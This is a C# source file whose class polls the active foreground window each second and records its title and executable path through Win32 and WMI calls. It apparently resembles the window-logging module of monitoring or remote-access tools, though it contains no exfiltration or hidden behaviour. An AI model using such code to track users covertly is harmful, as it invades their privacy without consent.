using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;

namespace Modules
{
    internal sealed class WindowManager
    {
        public static string ActiveWindow;
        public static readonly Thread MainThread = new Thread(StartGetWindowInfo);
        public static bool isEnabled = false;

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        public static void IsEnabledSet(bool status)
        {
            isEnabled = status;
        }
        private static void StartGetWindowInfo()
        {
            string prevActiveWindow = "";
            while (true)
            {
                if (isEnabled)
                {
                    Thread.Sleep(1000);
                    ActiveWindow = GetActiveWindowTitle();
                    if (ActiveWindow == prevActiveWindow)
                    {
                        continue;
                    }
                    prevActiveWindow = ActiveWindow;
                }
                else
                {
                    break;
                }
            }
        }
        //get active window
        private static string GetActiveWindowTitle()
        {
            try
            {
                var hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out var pid);
                var proc = Process.GetProcessById((int)pid);
                var title = proc.MainWindowTitle;
                var procExe = ProcessExecutablePath(proc);
                if (!string.IsNullOrWhiteSpace(title))
                {
                    ActiveWindow = title + " ### " + procExe;
                }
                else
                {
                    ActiveWindow = "Unknown";
                }
                return ActiveWindow;
            }
            catch (Exception)
            {
                return ActiveWindow = "Unknown";
            }
        }

        private static string ProcessExecutablePath(Process process)
        {
            try
            {
                if (process.MainModule != null)
                {
                    return process.MainModule.FileName;
                }
            }
            catch
            {
                var query = $"SELECT ExecutablePath, ProcessID FROM Win32_Process WHERE ProcessID = {process.Id}";
                using (var searcher = new ManagementObjectSearcher(query))
                using (var collection = searcher.Get())
                {
                    foreach (var item in collection)
                    {
                        var id = item["ProcessID"];
                        var path = item["ExecutablePath"];

                        if (path != null && id.ToString() == process.Id.ToString())
                        {
                            return path.ToString();
                        }
                    }
                }
            }
            return "Unknown";
        }
    }
}